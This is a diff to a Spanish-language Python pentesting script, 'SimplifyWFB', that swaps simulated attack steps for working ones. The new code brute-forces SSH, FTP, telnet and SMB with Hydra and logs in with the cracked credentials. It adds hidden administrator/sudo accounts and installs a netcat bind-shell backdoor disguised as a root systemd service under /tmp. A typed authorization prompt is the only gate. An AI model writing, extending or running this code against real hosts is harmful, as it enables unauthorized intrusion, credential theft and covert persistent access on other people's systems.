@@ -381,26 +381,93 @@ class SimplifyWFB:
             if service['service'] in ['ssh', 'ftp', 'telnet', 'smb']:
                 print(f"💥 Fuerza bruta en {service['host']}:{service['port']} ({service['service']})")
                 
-                # Simular ataque de fuerza bruta
-                if self._simulate_brute_force(service):
+                # Ejecutar ataque de fuerza bruta real
+                brute_result = self._real_brute_force(service)
+                if brute_result:
                     cred = {
                         'host': service['host'],
                         'port': service['port'],
                         'service': service['service'],
-                        'username': 'admin',
-                        'password': 'admin',
+                        'username': brute_result['username'],
+                        'password': brute_result['password'],
                         'method': 'brute_force',
                         'timestamp': time.time()
                     }
                     credentials.append(cred)
+                    print(f"✅ Credenciales encontradas: {brute_result['username']}:{brute_result['password']}")
         
         return credentials
     
-    def _simulate_brute_force(self, service: Dict[str, Any]) -> bool:
-        """Simular ataque de fuerza bruta"""
-        # En un escenario real, aquí se ejecutaría hydra o similar
-        # Por simplicidad, simulamos éxito en algunos casos
-        return hash(service['host']) % 3 == 0
+    def _real_brute_force(self, service: Dict[str, Any]) -> Optional[Dict[str, str]]:
+        """Ejecutar ataque de fuerza bruta real con Hydra"""
+        try:
+            # Crear archivo temporal con usuarios
+            users_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
+            for user in self.config['default_users']:
+                users_file.write(f"{user}\n")
+            users_file.close()
+            
+            # Crear archivo temporal con contraseñas
+            passwords_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
+            for password in self.config['default_passwords']:
+                passwords_file.write(f"{password}\n")
+            passwords_file.close()
+            
+            # Determinar protocolo para Hydra
+            protocol_map = {
+                'ssh': 'ssh',
+                'ftp': 'ftp',
+                'telnet': 'telnet',
+                'smb': 'smb',
+                'http': 'http-get',
+                'https': 'https-get'
+            }
+            
+            protocol = protocol_map.get(service['service'], service['service'])
+            
+            # Comando Hydra
+            hydra_cmd = [
+                'hydra',
+                '-L', users_file.name,
+                '-P', passwords_file.name,
+                '-t', '4',  # 4 threads
+                '-f',  # Stop on first success
+                '-o', '-',  # Output to stdout
+                f"{service['host']}://{protocol}"
+            ]
+            
+            if service['port'] not in [22, 21, 23, 80, 443, 445]:
+                hydra_cmd.extend(['-s', str(service['port'])])
+            
+            print(f"🔍 Ejecutando Hydra: {' '.join(hydra_cmd)}")
+            
+            # Ejecutar Hydra
+            result = self._run_command(hydra_cmd, timeout=300)  # 5 minutos timeout
+            
+            # Limpiar archivos temporales
+            os.unlink(users_file.name)
+            os.unlink(passwords_file.name)
+            
+            if result['success'] and result['stdout']:
+                # Parsear salida de Hydra
+                lines = result['stdout'].split('\n')
+                for line in lines:
+                    if 'login:' in line and 'password:' in line:
+                        # Extraer credenciales
+                        parts = line.split()
+                        if len(parts) >= 4:
+                            username = parts[1].replace('login:', '')
+                            password = parts[3].replace('password:', '')
+                            return {
+                                'username': username,
+                                'password': password
+                            }
+            
+            return None
+            
+        except Exception as e:
+            print(f"❌ Error en fuerza bruta real: {e}")
+            return None
     
     def _test_default_credentials(self) -> List[Dict[str, Any]]:
         """Probar credenciales por defecto"""
@@ -484,8 +551,8 @@ class SimplifyWFB:
         for cred in credentials:
             print(f"🔓 Explotando {cred['host']} con {cred['username']}:{cred['password']}")
             
-            # Simular explotación exitosa
-            if self._simulate_exploitation(cred):
+            # Ejecutar explotación real
+            if self._real_exploitation(cred):
                 comp_system = {
                     'host': cred['host'],
                     'port': cred['port'],
@@ -499,9 +566,177 @@ class SimplifyWFB:
         
         return compromised
     
-    def _simulate_exploitation(self, cred: Dict[str, Any]) -> bool:
-        """Simular explotación de credencial"""
-        return hash(f"{cred['host']}{cred['username']}") % 2 == 0
+    def _real_exploitation(self, cred: Dict[str, Any]) -> bool:
+        """Ejecutar explotación real de credencial"""
+        try:
+            if cred['service'] == 'ssh':
+                return self._test_ssh_connection(cred)
+            elif cred['service'] == 'ftp':
+                return self._test_ftp_connection(cred)
+            elif cred['service'] == 'smb':
+                return self._test_smb_connection(cred)
+            elif cred['service'] in ['http', 'https']:
+                return self._test_http_connection(cred)
+            else:
+                return self._test_generic_connection(cred)
+        except Exception as e:
+            print(f"❌ Error en explotación real: {e}")
+            return False
+    
+    def _test_ssh_connection(self, cred: Dict[str, Any]) -> bool:
+        """Probar conexión SSH real"""
+        try:
+            import paramiko
+            
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            ssh.connect(
+                cred['host'],
+                port=cred['port'],
+                username=cred['username'],
+                password=cred['password'],
+                timeout=10
+            )
+            
+            # Ejecutar comando simple para verificar
+            stdin, stdout, stderr = ssh.exec_command('whoami')
+            result = stdout.read().decode().strip()
+            
+            ssh.close()
+            
+            if result:
+                print(f"✅ SSH exitoso: {cred['username']}@{cred['host']} -> {result}")
+                return True
+            
+        except ImportError:
+            print("⚠️ Paramiko no disponible, usando ssh command")
+            # Fallback a comando ssh
+            ssh_cmd = [
+                'ssh',
+                '-o', 'StrictHostKeyChecking=no',
+                '-o', 'UserKnownHostsFile=/dev/null',
+                '-o', 'ConnectTimeout=10',
+                f"{cred['username']}@{cred['host']}",
+                'whoami'
+            ]
+            
+            result = self._run_command(ssh_cmd, timeout=15)
+            if result['success']:
+                print(f"✅ SSH exitoso: {cred['username']}@{cred['host']}")
+                return True
+        except Exception as e:
+            print(f"❌ SSH falló: {e}")
+        
+        return False
+    
+    def _test_ftp_connection(self, cred: Dict[str, Any]) -> bool:
+        """Probar conexión FTP real"""
+        try:
+            from ftplib import FTP
+            
+            ftp = FTP()
+            ftp.connect(cred['host'], cred['port'], timeout=10)
+            ftp.login(cred['username'], cred['password'])
+            
+            # Listar directorio para verificar
+            files = ftp.nlst()
+            ftp.quit()
+            
+            print(f"✅ FTP exitoso: {cred['username']}@{cred['host']} -> {len(files)} archivos")
+            return True
+            
+        except ImportError:
+            print("⚠️ ftplib no disponible, usando ftp command")
+            # Fallback a comando ftp
+            ftp_script = f"""
+open {cred['host']} {cred['port']}
+user {cred['username']} {cred['password']}
+ls
+quit
+"""
+            
+            result = self._run_command(['ftp', '-n'], input=ftp_script, timeout=15)
+            if result['success'] and '230' in result['stdout']:
+                print(f"✅ FTP exitoso: {cred['username']}@{cred['host']}")
+                return True
+        except Exception as e:
+            print(f"❌ FTP falló: {e}")
+        
+        return False
+    
+    def _test_smb_connection(self, cred: Dict[str, Any]) -> bool:
+        """Probar conexión SMB real"""
+        try:
+            # Usar smbclient para probar conexión
+            smb_cmd = [
+                'smbclient',
+                f"//{cred['host']}/IPC$",
+                '-U', f"{cred['username']}%{cred['password']}",
+                '-c', 'ls'
+            ]
+            
+            result = self._run_command(smb_cmd, timeout=15)
+            if result['success']:
+                print(f"✅ SMB exitoso: {cred['username']}@{cred['host']}")
+                return True
+        except Exception as e:
+            print(f"❌ SMB falló: {e}")
+        
+        return False
+    
+    def _test_http_connection(self, cred: Dict[str, Any]) -> bool:
+        """Probar conexión HTTP real"""
+        try:
+            import urllib.request
+            import urllib.parse
+            import base64
+            
+            # Crear autenticación básica
+            auth_string = f"{cred['username']}:{cred['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Determinar protocolo
+            protocol = 'https' if cred['service'] == 'https' else 'http'
+            url = f"{protocol}://{cred['host']}:{cred['port']}/"
+            
+            # Crear request con autenticación
+            req = urllib.request.Request(url)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            
+            # Realizar request
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    print(f"✅ HTTP exitoso: {cred['username']}@{cred['host']}")
+                    return True
+        except Exception as e:
+            print(f"❌ HTTP falló: {e}")
+        
+        return False
+    
+    def _test_generic_connection(self, cred: Dict[str, Any]) -> bool:
+        """Probar conexión genérica con telnet"""
+        try:
+            import telnetlib
+            
+            tn = telnetlib.Telnet(cred['host'], cred['port'], timeout=10)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(cred['username'].encode('ascii') + b"\n")
+            tn.read_until(b"Password: ", timeout=5)
+            tn.write(cred['password'].encode('ascii') + b"\n")
+            
+            # Leer respuesta
+            response = tn.read_some().decode('ascii', errors='ignore')
+            tn.close()
+            
+            if '$ ' in response or '> ' in response or '# ' in response:
+                print(f"✅ Conexión genérica exitosa: {cred['username']}@{cred['host']}")
+                return True
+        except Exception as e:
+            print(f"❌ Conexión genérica falló: {e}")
+        
+        return False
     
     def _establish_lateral_connections(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
         """Establecer conexiones laterales"""
@@ -564,40 +799,272 @@ class SimplifyWFB:
             print(f"❌ Error en persistencia: {e}")
     
     def _create_persistent_users(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
-        """Crear usuarios persistentes"""
+        """Crear usuarios persistentes reales"""
         users = []
         
         for system in compromised:
-            user = {
-                'host': system['host'],
-                'username': f'svc_{system["host"].replace(".", "_")}',
-                'password': f'P@ssw0rd_{system["host"].split(".")[-1]}!',
-                'groups': ['administrators', 'remote_desktop_users'],
-                'description': 'System Maintenance Service',
-                'created': True,
-                'timestamp': time.time()
-            }
-            users.append(user)
+            username = f'svc_{system["host"].replace(".", "_")}'
+            password = f'P@ssw0rd_{system["host"].split(".")[-1]}!'
+            
+            # Intentar crear usuario real
+            if self._create_real_user(system, username, password):
+                user = {
+                    'host': system['host'],
+                    'username': username,
+                    'password': password,
+                    'groups': ['administrators', 'remote_desktop_users'],
+                    'description': 'System Maintenance Service',
+                    'created': True,
+                    'timestamp': time.time()
+                }
+                users.append(user)
+                print(f"✅ Usuario creado: {username}@{system['host']}")
+            else:
+                print(f"❌ Falló creación de usuario: {username}@{system['host']}")
         
         return users
     
+    def _create_real_user(self, system: Dict[str, Any], username: str, password: str) -> bool:
+        """Crear usuario real en el sistema"""
+        try:
+            if system['service'] == 'ssh':
+                return self._create_user_via_ssh(system, username, password)
+            elif system['service'] == 'smb':
+                return self._create_user_via_smb(system, username, password)
+            else:
+                return self._create_user_generic(system, username, password)
+        except Exception as e:
+            print(f"❌ Error creando usuario real: {e}")
+            return False
+    
+    def _create_user_via_ssh(self, system: Dict[str, Any], username: str, password: str) -> bool:
+        """Crear usuario via SSH"""
+        try:
+            import paramiko
+            
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            ssh.connect(
+                system['host'],
+                port=system['port'],
+                username=system['username'],
+                password=system['password'],
+                timeout=10
+            )
+            
+            # Comandos para crear usuario (Linux/Unix)
+            commands = [
+                f"sudo useradd -m -s /bin/bash {username}",
+                f"echo '{username}:{password}' | sudo chpasswd",
+                f"sudo usermod -aG sudo {username}",
+                f"sudo usermod -aG wheel {username}"
+            ]
+            
+            for cmd in commands:
+                stdin, stdout, stderr = ssh.exec_command(cmd)
+                exit_status = stdout.channel.recv_exit_status()
+                if exit_status != 0:
+                    print(f"⚠️ Comando falló: {cmd}")
+            
+            ssh.close()
+            return True
+            
+        except ImportError:
+            # Fallback a comando ssh
+            for cmd in commands:
+                ssh_cmd = [
+                    'ssh',
+                    '-o', 'StrictHostKeyChecking=no',
+                    f"{system['username']}@{system['host']}",
+                    cmd
+                ]
+                result = self._run_command(ssh_cmd, timeout=15)
+                if not result['success']:
+                    print(f"⚠️ Comando SSH falló: {cmd}")
+            return True
+        except Exception as e:
+            print(f"❌ Error SSH: {e}")
+            return False
+    
+    def _create_user_via_smb(self, system: Dict[str, Any], username: str, password: str) -> bool:
+        """Crear usuario via SMB (Windows)"""
+        try:
+            # Usar net user command via SMB
+            net_cmd = [
+                'smbclient',
+                f"//{system['host']}/C$",
+                '-U', f"{system['username']}%{system['password']}",
+                '-c', f"net user {username} {password} /add && net localgroup administrators {username} /add"
+            ]
+            
+            result = self._run_command(net_cmd, timeout=30)
+            return result['success']
+        except Exception as e:
+            print(f"❌ Error SMB: {e}")
+            return False
+    
+    def _create_user_generic(self, system: Dict[str, Any], username: str, password: str) -> bool:
+        """Crear usuario genérico"""
+        # Para otros servicios, intentar comandos básicos
+        try:
+            import telnetlib
+            
+            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(system['username'].encode('ascii') + b"\n")
+            tn.read_until(b"Password: ", timeout=5)
+            tn.write(system['password'].encode('ascii') + b"\n")
+            
+            # Intentar crear usuario
+            tn.write(f"useradd -m {username}\n".encode('ascii'))
+            tn.write(f"passwd {username}\n".encode('ascii'))
+            tn.write(f"{password}\n".encode('ascii'))
+            tn.write(f"{password}\n".encode('ascii'))
+            
+            tn.close()
+            return True
+        except Exception as e:
+            print(f"❌ Error genérico: {e}")
+            return False
+    
     def _create_backdoors(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
-        """Crear backdoors"""
+        """Crear backdoors reales"""
         backdoors = []
         
         for system in compromised:
-            backdoor = {
-                'host': system['host'],
-                'type': 'netcat',
-                'port': 4444 + hash(system['host']) % 1000,
-                'method': 'reverse_shell',
-                'payload': f'nc -lvp {4444 + hash(system["host"]) % 1000} -e /bin/bash',
-                'created': True,
-                'timestamp': time.time()
-            }
-            backdoors.append(backdoor)
+            port = 4444 + hash(system['host']) % 1000
+            
+            # Intentar crear backdoor real
+            if self._create_real_backdoor(system, port):
+                backdoor = {
+                    'host': system['host'],
+                    'type': 'netcat',
+                    'port': port,
+                    'method': 'reverse_shell',
+                    'payload': f'nc -lvp {port} -e /bin/bash',
+                    'created': True,
+                    'timestamp': time.time()
+                }
+                backdoors.append(backdoor)
+                print(f"✅ Backdoor creado: {system['host']}:{port}")
+            else:
+                print(f"❌ Falló creación de backdoor: {system['host']}:{port}")
         
         return backdoors
+    
+    def _create_real_backdoor(self, system: Dict[str, Any], port: int) -> bool:
+        """Crear backdoor real en el sistema"""
+        try:
+            if system['service'] == 'ssh':
+                return self._create_backdoor_via_ssh(system, port)
+            else:
+                return self._create_backdoor_generic(system, port)
+        except Exception as e:
+            print(f"❌ Error creando backdoor real: {e}")
+            return False
+    
+    def _create_backdoor_via_ssh(self, system: Dict[str, Any], port: int) -> bool:
+        """Crear backdoor via SSH"""
+        try:
+            import paramiko
+            
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            ssh.connect(
+                system['host'],
+                port=system['port'],
+                username=system['username'],
+                password=system['password'],
+                timeout=10
+            )
+            
+            # Crear script de backdoor
+            backdoor_script = f"""#!/bin/bash
+while true; do
+    nc -lvp {port} -e /bin/bash
+    sleep 5
+done
+"""
+            
+            # Escribir script
+            stdin, stdout, stderr = ssh.exec_command(f"cat > /tmp/.service_{port}.sh << 'EOF'\n{backdoor_script}EOF")
+            
+            # Hacer ejecutable
+            stdin, stdout, stderr = ssh.exec_command(f"chmod +x /tmp/.service_{port}.sh")
+            
+            # Crear servicio systemd
+            service_content = f"""[Unit]
+Description=System Service {port}
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/tmp/.service_{port}.sh
+Restart=always
+RestartSec=5
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+            
+            stdin, stdout, stderr = ssh.exec_command(f"cat > /etc/systemd/system/service_{port}.service << 'EOF'\n{service_content}EOF")
+            
+            # Habilitar y iniciar servicio
+            stdin, stdout, stderr = ssh.exec_command("systemctl daemon-reload")
+            stdin, stdout, stderr = ssh.exec_command(f"systemctl enable service_{port}.service")
+            stdin, stdout, stderr = ssh.exec_command(f"systemctl start service_{port}.service")
+            
+            ssh.close()
+            return True
+            
+        except ImportError:
+            # Fallback a comando ssh
+            commands = [
+                f"cat > /tmp/.service_{port}.sh << 'EOF'\n{backdoor_script}EOF",
+                f"chmod +x /tmp/.service_{port}.sh",
+                f"cat > /etc/systemd/system/service_{port}.service << 'EOF'\n{service_content}EOF",
+                "systemctl daemon-reload",
+                f"systemctl enable service_{port}.service",
+                f"systemctl start service_{port}.service"
+            ]
+            
+            for cmd in commands:
+                ssh_cmd = [
+                    'ssh',
+                    '-o', 'StrictHostKeyChecking=no',
+                    f"{system['username']}@{system['host']}",
+                    cmd
+                ]
+                result = self._run_command(ssh_cmd, timeout=15)
+                if not result['success']:
+                    print(f"⚠️ Comando SSH falló: {cmd}")
+            return True
+        except Exception as e:
+            print(f"❌ Error SSH backdoor: {e}")
+            return False
+    
+    def _create_backdoor_generic(self, system: Dict[str, Any], port: int) -> bool:
+        """Crear backdoor genérico"""
+        try:
+            import telnetlib
+            
+            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(system['username'].encode('ascii') + b"\n")
+            tn.read_until(b"Password: ", timeout=5)
+            tn.write(system['password'].encode('ascii') + b"\n")
+            
+            # Crear backdoor simple
+            tn.write(f"nohup nc -lvp {port} -e /bin/bash &\n".encode('ascii'))
+            
+            tn.close()
+            return True
+        except Exception as e:
+            print(f"❌ Error backdoor genérico: {e}")
+            return False
     
     def _establish_remote_connections(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
         """Establecer conexiones remotas"""
@@ -757,26 +1224,255 @@ class SimplifyWFB:
             print(f"❌ Error en limpieza: {e}")
     
     def _cleanup_users(self):
-        """Limpiar usuarios creados"""
+        """Limpiar usuarios creados reales"""
         users = self.report['phase_4_persistence']['users_created']
         for user in users:
-            self.report['cleanup']['items_cleaned'].append({
-                'type': 'user',
-                'host': user['host'],
-                'username': user['username'],
-                'action': 'deleted'
-            })
+            if self._delete_real_user(user):
+                self.report['cleanup']['items_cleaned'].append({
+                    'type': 'user',
+                    'host': user['host'],
+                    'username': user['username'],
+                    'action': 'deleted',
+                    'success': True
+                })
+                print(f"✅ Usuario eliminado: {user['username']}@{user['host']}")
+            else:
+                self.report['cleanup']['items_cleaned'].append({
+                    'type': 'user',
+                    'host': user['host'],
+                    'username': user['username'],
+                    'action': 'deleted',
+                    'success': False
+                })
+                print(f"❌ Falló eliminación de usuario: {user['username']}@{user['host']}")
+    
+    def _delete_real_user(self, user: Dict[str, Any]) -> bool:
+        """Eliminar usuario real del sistema"""
+        try:
+            # Buscar sistema comprometido correspondiente
+            compromised = self.report['phase_3_lateral_movement']['compromised_systems']
+            system = None
+            for comp in compromised:
+                if comp['host'] == user['host']:
+                    system = comp
+                    break
+            
+            if not system:
+                return False
+            
+            if system['service'] == 'ssh':
+                return self._delete_user_via_ssh(system, user)
+            elif system['service'] == 'smb':
+                return self._delete_user_via_smb(system, user)
+            else:
+                return self._delete_user_generic(system, user)
+        except Exception as e:
+            print(f"❌ Error eliminando usuario real: {e}")
+            return False
+    
+    def _delete_user_via_ssh(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
+        """Eliminar usuario via SSH"""
+        try:
+            import paramiko
+            
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            ssh.connect(
+                system['host'],
+                port=system['port'],
+                username=system['username'],
+                password=system['password'],
+                timeout=10
+            )
+            
+            # Comandos para eliminar usuario
+            commands = [
+                f"sudo userdel -r {user['username']}",
+                f"sudo pkill -u {user['username']}"
+            ]
+            
+            for cmd in commands:
+                stdin, stdout, stderr = ssh.exec_command(cmd)
+                exit_status = stdout.channel.recv_exit_status()
+                if exit_status != 0:
+                    print(f"⚠️ Comando falló: {cmd}")
+            
+            ssh.close()
+            return True
+            
+        except ImportError:
+            # Fallback a comando ssh
+            for cmd in commands:
+                ssh_cmd = [
+                    'ssh',
+                    '-o', 'StrictHostKeyChecking=no',
+                    f"{system['username']}@{system['host']}",
+                    cmd
+                ]
+                result = self._run_command(ssh_cmd, timeout=15)
+                if not result['success']:
+                    print(f"⚠️ Comando SSH falló: {cmd}")
+            return True
+        except Exception as e:
+            print(f"❌ Error SSH: {e}")
+            return False
+    
+    def _delete_user_via_smb(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
+        """Eliminar usuario via SMB (Windows)"""
+        try:
+            # Usar net user command via SMB
+            net_cmd = [
+                'smbclient',
+                f"//{system['host']}/C$",
+                '-U', f"{system['username']}%{system['password']}",
+                '-c', f"net user {user['username']} /delete"
+            ]
+            
+            result = self._run_command(net_cmd, timeout=30)
+            return result['success']
+        except Exception as e:
+            print(f"❌ Error SMB: {e}")
+            return False
+    
+    def _delete_user_generic(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
+        """Eliminar usuario genérico"""
+        try:
+            import telnetlib
+            
+            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(system['username'].encode('ascii') + b"\n")
+            tn.read_until(b"Password: ", timeout=5)
+            tn.write(system['password'].encode('ascii') + b"\n")
+            
+            # Eliminar usuario
+            tn.write(f"userdel -r {user['username']}\n".encode('ascii'))
+            
+            tn.close()
+            return True
+        except Exception as e:
+            print(f"❌ Error genérico: {e}")
+            return False
     
     def _cleanup_backdoors(self):
-        """Limpiar backdoors"""
+        """Limpiar backdoors reales"""
         backdoors = self.report['phase_4_persistence']['backdoors_created']
         for backdoor in backdoors:
-            self.report['cleanup']['items_cleaned'].append({
-                'type': 'backdoor',
-                'host': backdoor['host'],
-                'port': backdoor['port'],
-                'action': 'removed'
-            })
+            if self._delete_real_backdoor(backdoor):
+                self.report['cleanup']['items_cleaned'].append({
+                    'type': 'backdoor',
+                    'host': backdoor['host'],
+                    'port': backdoor['port'],
+                    'action': 'removed',
+                    'success': True
+                })
+                print(f"✅ Backdoor eliminado: {backdoor['host']}:{backdoor['port']}")
+            else:
+                self.report['cleanup']['items_cleaned'].append({
+                    'type': 'backdoor',
+                    'host': backdoor['host'],
+                    'port': backdoor['port'],
+                    'action': 'removed',
+                    'success': False
+                })
+                print(f"❌ Falló eliminación de backdoor: {backdoor['host']}:{backdoor['port']}")
+    
+    def _delete_real_backdoor(self, backdoor: Dict[str, Any]) -> bool:
+        """Eliminar backdoor real del sistema"""
+        try:
+            # Buscar sistema comprometido correspondiente
+            compromised = self.report['phase_3_lateral_movement']['compromised_systems']
+            system = None
+            for comp in compromised:
+                if comp['host'] == backdoor['host']:
+                    system = comp
+                    break
+            
+            if not system:
+                return False
+            
+            if system['service'] == 'ssh':
+                return self._delete_backdoor_via_ssh(system, backdoor)
+            else:
+                return self._delete_backdoor_generic(system, backdoor)
+        except Exception as e:
+            print(f"❌ Error eliminando backdoor real: {e}")
+            return False
+    
+    def _delete_backdoor_via_ssh(self, system: Dict[str, Any], backdoor: Dict[str, Any]) -> bool:
+        """Eliminar backdoor via SSH"""
+        try:
+            import paramiko
+            
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            ssh.connect(
+                system['host'],
+                port=system['port'],
+                username=system['username'],
+                password=system['password'],
+                timeout=10
+            )
+            
+            port = backdoor['port']
+            
+            # Comandos para eliminar backdoor
+            commands = [
+                f"systemctl stop service_{port}.service",
+                f"systemctl disable service_{port}.service",
+                f"rm -f /etc/systemd/system/service_{port}.service",
+                f"rm -f /tmp/.service_{port}.sh",
+                "systemctl daemon-reload",
+                f"pkill -f 'nc -lvp {port}'"
+            ]
+            
+            for cmd in commands:
+                stdin, stdout, stderr = ssh.exec_command(cmd)
+                exit_status = stdout.channel.recv_exit_status()
+                if exit_status != 0:
+                    print(f"⚠️ Comando falló: {cmd}")
+            
+            ssh.close()
+            return True
+            
+        except ImportError:
+            # Fallback a comando ssh
+            for cmd in commands:
+                ssh_cmd = [
+                    'ssh',
+                    '-o', 'StrictHostKeyChecking=no',
+                    f"{system['username']}@{system['host']}",
+                    cmd
+                ]
+                result = self._run_command(ssh_cmd, timeout=15)
+                if not result['success']:
+                    print(f"⚠️ Comando SSH falló: {cmd}")
+            return True
+        except Exception as e:
+            print(f"❌ Error SSH: {e}")
+            return False
+    
+    def _delete_backdoor_generic(self, system: Dict[str, Any], backdoor: Dict[str, Any]) -> bool:
+        """Eliminar backdoor genérico"""
+        try:
+            import telnetlib
+            
+            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(system['username'].encode('ascii') + b"\n")
+            tn.read_until(b"Password: ", timeout=5)
+            tn.write(system['password'].encode('ascii') + b"\n")
+            
+            # Eliminar backdoor
+            tn.write(f"pkill -f 'nc -lvp {backdoor['port']}'\n".encode('ascii'))
+            
+            tn.close()
+            return True
+        except Exception as e:
+            print(f"❌ Error genérico: {e}")
+            return False
     
     def _cleanup_connections(self):
         """Limpiar conexiones remotas"""
@@ -871,8 +1567,32 @@ def main():
     """Función principal"""
     print("🔧 SimplifyWFB - Script Simplificado de Pentesting")
     print("=" * 60)
-    print("⚠️  ADVERTENCIA: Solo para uso autorizado y educativo")
+    print("⚠️  ADVERTENCIA CRÍTICA: HERRAMIENTA DE PENTESTING REAL")
     print("=" * 60)
+    print("🚨 ESTE SCRIPT EJECUTA ATAQUES REALES:")
+    print("   • Fuerza bruta con Hydra")
+    print("   • Explotación real de credenciales")
+    print("   • Creación de usuarios persistentes")
+    print("   • Instalación de backdoors")
+    print("   • Acceso remoto a sistemas")
+    print("=" * 60)
+    print("⚠️  SOLO PARA USO AUTORIZADO Y EDUCATIVO")
+    print("⚠️  EL USO NO AUTORIZADO ES ILEGAL")
+    print("⚠️  OBTENGA PERMISO ESCRITO ANTES DE USAR")
+    print("⚠️  LOS DESARROLLADORES NO SE HACEN RESPONSABLES")
+    print("=" * 60)
+    
+    # Confirmación de responsabilidad
+    while True:
+        confirm = input("\n¿Confirma que tiene autorización legal para usar esta herramienta? (sí/no): ").strip().lower()
+        if confirm in ['sí', 'si', 'yes', 'y']:
+            print("\n✅ Confirmación recibida. Procediendo...")
+            break
+        elif confirm in ['no', 'n']:
+            print("\n❌ Uso cancelado. Esta herramienta requiere autorización legal.")
+            sys.exit(1)
+        else:
+            print("\n❌ Respuesta inválida. Por favor responda 'sí' o 'no'.")
     
     # Crear instancia
     wfb = SimplifyWFB()
